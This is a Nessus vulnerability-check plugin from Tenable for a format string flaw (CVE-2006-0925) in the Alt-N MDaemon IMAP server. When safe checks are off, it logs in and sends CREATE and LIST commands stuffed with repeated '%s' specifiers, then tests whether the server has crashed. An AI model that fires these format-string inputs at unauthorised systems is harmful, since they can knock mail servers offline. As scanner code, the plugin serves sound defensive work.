#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote IMAP server is affected by a format string vulnerability. 

Description :

The remote host is running Alt-N MDaemon, an SMTP/IMAP server for the
Windows operating system family. 

The IMAP server component of MDaemon is affected by a format string
vulnerability involving folders with format string specifiers in their
names .  An authenticated attacker can leverage this issue to cause
the remote host to consume excessive CPU resources. 

Further, given the nature of format string vulnerabilities, this issue
is likely to lead to the execution of arbitrary code as LOCAL SYSTEM. 

See also :

http://www.nsag.ru/vuln/888.html
http://files.altn.com/MDaemon/Release/RelNotes_en.txt

Solution :

Upgrade to MDaemon 8.15 or later. 

Risk factor :

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:N/A:P/B:N)";


if (description) {
  script_id(20987);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-0925");
  script_bugtraq_id(16854);

  script_name(english:"MDaemon IMAP Server Format String Vulnerability");
  script_summary(english:"Checks for format string vulnerability in MDaemon IMAP server");

  script_description(english:desc);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("find_service.nes");
  script_exclude_keys("imap/false_imap");
  script_require_keys("imap/login", "imap/password");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");
include("imap_func.inc");


# Check the imap server.
port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(1);
if (get_kb_item("imap/false_imap") || get_kb_item("imap/overflow")) exit(1);


# Make sure it's MDaemon.
banner = get_imap_banner(port:port);
if (!banner || " MDaemon " >!< banner) exit(0);


# If safe checks are enabled...
if (safe_checks()) {
  if (egrep(pattern:"IMAP4.* MDaemon ([0-7]\..*|8\.(0.*|1\.[0-4])) ready", string:banner)) {
    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Nessus has determined the flaw exists with the application\n",
      "based only on the version in the IMAP server's banner.\n"
    );
    security_note(port:port, data:report);
  }
}
# Otherwise...
else {
  user = get_kb_item("imap/login");
  pass = get_kb_item("imap/password");
  if (!user || !pass) exit(0);

  # Establish a connection.
  tag = 0;
  soc = open_sock_tcp(port);
  if (!soc) exit(0);

  # Read banner.
  s = recv_line(socket:soc, length:1024);
  if (!strlen(s)) {
    close(soc);
    exit(0);
  }

  # Try to log in.
  ++tag;
  resp = NULL;
  c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  # If successful, try to exploit the flaw.
  if (resp && resp =~ "OK") {
    ++tag;
    resp = NULL;

    # First, we create a mailbox.
    mailbox = string(SCRIPT_NAME, "/", unixtime(), "/", crap(data:"%s", length:104));
    c = string("nessus", string(tag), " CREATE ", mailbox);
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
    }

    # Now try to list it.
    if (resp && resp =~ "OK" && "CREATE completed" >< s) {
      c = string(
        "nessus", string(tag), 
        ' LIST "', 
        mailbox, '" "', 
        crap(data:"%s", length:100), '"'
      );
      send(socket:soc, data:string(c, "\r\n"));
      while (s = recv_line(socket:soc, length:1024)) {
        s = chomp(s);
        m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
        if (!isnull(m)) {
          resp = m[1];
          break;
        }
      }

      # Check whether the server's down now.
      #
      # nb: the server may or may not have returned a response in s.
      soc2 = open_sock_tcp(port);
      if (soc2) s2 = recv_line(socket:soc2, length:1024);

      if (!soc2 || !strlen(s2)) {
        security_note(port);
        exit(0);
      }

      if (soc2) close(soc2);
    }
  }
  else if (resp =~ "BAD" || resp =~ "NO") {
    #if (log_verbosity > 1) debug_print("couldn't login with supplied imap credentials!", level:0);
  }

  # Logout.
  ++tag;
  resp = NULL;
  c = string("nessus", string(tag), " LOGOUT");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }
  close(soc);
}
